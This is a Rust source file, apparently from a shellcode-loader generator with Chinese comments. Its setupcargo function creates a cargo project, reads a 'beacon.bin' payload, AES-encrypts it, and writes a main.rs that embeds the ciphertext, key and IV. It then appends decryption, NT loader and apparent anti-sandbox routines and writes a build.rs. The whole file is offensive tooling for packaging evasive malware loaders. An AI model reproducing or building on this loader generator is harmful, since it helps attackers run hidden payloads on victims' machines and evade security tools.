#![allow(warnings)]
use base64::encode;
use libaes::Cipher;
use rand::Rng;
use std::fs;
use std::fs::File;
use std::io::{Read, Write};
use tools::*;
use winapi::um::cfgmgr32::fMD_CombinedWrite;

use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cbc};
use std::process::Command;
use tools::{aesdecryption, anti_s, build_, main_, main_imports, maincargo, ntloader};
use xz2::write::XzEncoder;

pub fn setupcargo(project_name: &str) {
    // 创建命令
    let output = Command::new("cargo")
        .args(&["new", project_name])
        .output()
        .expect("Failed to create a new Rust project");

    // 添加cargo.toml
    let cargo_toml_path = format!("{}/Cargo.toml", project_name);
    let mut cargo_toml = std::fs::OpenOptions::new()
        .append(true)
        .open(cargo_toml_path)
        .expect("Failed to open Cargo.toml");

    let dependency = maincargo();

    //写入文件
    writeln!(cargo_toml, "{}", dependency).expect("[!] Failed to write to Cargo.toml");

    let code = "".to_string();

    let buffer = read_bin("beacon.bin");
    let (encrypted, iv, key) = encipher_bin(&buffer);

    let mut shellcode = format!("static mut ciphertext: &str = \"{}\";\n static mut key: &str = \"{}\";\n static mut iv: &str = \"{}\";\n", encrypted, key, iv);

    let mut main_rs_path = format!("{}/src/main.rs", project_name);

    let combined_code =
        main_imports() + &shellcode + &aesdecryption() + &ntloader() + &anti_s() + &main_();

    let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
    main_rs
        .write_all(combined_code.as_bytes())
        .expect("[!] Failed to write to main.rs");

    let mut build_code = &build_();
    let mut build_rs_path = format!("{}/build.rs", project_name);
    let mut build_rs = File::create(build_rs_path).expect("创建build.rs失败");
    build_rs
        .write_all(build_code.as_bytes())
        .expect("写入build.rs失败")
}
